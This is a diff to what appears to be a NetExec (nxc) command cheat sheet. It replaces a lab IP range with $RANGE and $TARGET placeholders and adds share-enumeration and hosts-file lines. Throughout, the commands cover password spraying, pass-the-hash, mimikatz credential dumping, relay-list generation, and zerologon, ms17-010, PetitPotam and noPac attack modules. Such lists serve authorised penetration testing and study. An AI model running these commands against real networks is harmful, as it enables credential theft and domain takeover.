@@ -8,17 +8,19 @@ netexec smb "$TARGET" --continue-on-success -u users.txt -p passwords.txt
 netexec smb "$TARGET" --local-auth -u "$USER" -H "$NT_HASH" -M enum_avproducts
 netexec smb "$TARGET" --local-auth -u "$USER" -H "$NT_HASH" -M mimikatz
 netexec smb "$TARGET" -u '' -p '' --pass-pol
-netexec smb 192.168.56.0/24 --gen-relay-list smb_targets.txt
-netexec smb 192.168.56.0/24 --local-auth -u '' -p ''
-netexec smb 192.168.56.0/24 -u "$USER" -p "$PASSWORD" --loggedon-users
-netexec smb 192.168.56.0/24 -u "$USER" -p "$PASSWORD" --sessions
-netexec smb 192.168.56.0/24 -u "$USER" -p "$PASSWORD" --shares
-netexec smb 192.168.56.0/24 -u '' -p '' --shares
-netexec smb "$IP" -u "$USER" -p "$PASSWORD" -M noPac
-netexec smb "$IP" -u "$USER" -p "$PASSWORD" -M petitpotam
-netexec smb "$IP" -u '' -p '' -M zerologon
-netexec smb "$IP" -u '' -p '' -M ms17-010
-netexec smb "$IP" -u '' -p '' -M ioxidresolver
+netexec smb "$RANGE" --gen-relay-list smb_targets.txt
+netexec smb "$RANGE" --local-auth -u '' -p ''
+netexec smb "$RANGE" -u "$USER" -p "$PASSWORD" --loggedon-users
+netexec smb "$RANGE" -u "$USER" -p "$PASSWORD" --sessions
+netexec smb "$RANGE" -u "$USER" -p "$PASSWORD" --shares
+netexec smb "$RANGE" -u '' -p '' --shares
+netexec smb "$TARGET" -u "$USER" -p "$PASSWORD" -M noPac
+netexec smb "$TARGET" -u "$USER" -p "$PASSWORD" -M petitpotam
+netexec smb "$TARGET" -u '' -p '' -M zerologon
+netexec smb "$TARGET" -u '' -p '' -M ms17-010
+netexec smb "$TARGET" -u '' -p '' -M ioxidresolver
+nxc smb "$TARGET" -u "$USER" -p "$PASSWORD" --shares
+netexec smb "$TARGET" -u '' -p '' --generate-hosts-file hosts
 netexec smb --list-modules
 nxc ldap "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" -M maq
 nxc ldap "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD"
@@ -29,15 +31,16 @@ nxc smb "$TARGET" --continue-on-success -u users.txt -p passwords.txt
 nxc smb "$TARGET" --local-auth -u "$USER" -H "$NT_HASH" -M enum_avproducts
 nxc smb "$TARGET" --local-auth -u "$USER" -H "$NT_HASH" -M mimikatz
 nxc smb "$TARGET" -u '' -p '' --pass-pol
-nxc smb 192.168.56.0/24 --gen-relay-list smb_targets.txt
-nxc smb 192.168.56.0/24 --local-auth -u '' -p ''
-nxc smb 192.168.56.0/24 -u "$USER" -p "$PASSWORD" --loggedon-users
-nxc smb 192.168.56.0/24 -u "$USER" -p "$PASSWORD" --sessions
-nxc smb 192.168.56.0/24 -u "$USER" -p "$PASSWORD" --shares
-nxc smb 192.168.56.0/24 -u '' -p '' --shares
-nxc smb "$IP" -u "$USER" -p "$PASSWORD" -M noPac
-nxc smb "$IP" -u "$USER" -p "$PASSWORD" -M petitpotam
-nxc smb "$IP" -u '' -p '' -M zerologon
-nxc smb "$IP" -u '' -p '' -M ms17-010
-nxc smb "$IP" -u '' -p '' -M ioxidresolver
-
+nxc smb "$RANGE" --gen-relay-list smb_targets.txt
+nxc smb "$RANGE" --local-auth -u '' -p ''
+nxc smb "$RANGE" -u "$USER" -p "$PASSWORD" --loggedon-users
+nxc smb "$RANGE" -u "$USER" -p "$PASSWORD" --sessions
+nxc smb "$RANGE" -u "$USER" -p "$PASSWORD" --shares
+nxc smb "$RANGE" -u '' -p '' --shares
+nxc smb "$TARGET" -u "$USER" -p "$PASSWORD" -M noPac
+nxc smb "$TARGET" -u "$USER" -p "$PASSWORD" -M petitpotam
+nxc smb "$TARGET" -u '' -p '' -M zerologon
+nxc smb "$TARGET" -u '' -p '' -M ms17-010
+nxc smb "$TARGET" -u '' -p '' -M ioxidresolver
+nxc smb "$TARGET" -u "$USER" -p "$PASSWORD" --shares
+nxc smb "$TARGET" -u '' -p '' --generate-hosts-file hosts
